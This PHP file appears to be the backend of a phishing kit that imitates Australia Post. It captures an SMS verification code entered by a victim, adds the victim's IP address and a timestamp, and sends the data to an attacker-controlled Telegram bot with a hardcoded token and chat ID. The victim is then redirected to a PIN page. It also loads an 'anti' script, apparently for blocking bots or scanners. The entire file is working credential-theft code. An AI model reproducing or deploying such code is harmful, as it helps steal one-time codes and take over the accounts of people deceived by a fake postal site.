<?php

include("../anti/index.php");

$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");


if(($_POST['msg'] != ""))
	
	{	

$message .= "______________AU POST_______________\n";
$message .= "* SMS CODE : ".$_POST['msg']."\n";

$message .= "* IP   : $ip\n";
$message .= "* date   : $date\n";
$message .= "______________________________\n";


             file_get_contents("https://api.telegram.org/bot6122494476:AAHw3y87SQbDVg2suTMbuAkwFEFmvSCTQUs/sendMessage?chat_id=-4091358695&text=" . urlencode($message)."" );
        header("Location: ../pin.php");
} else


header("Location: ../pin.php");




?>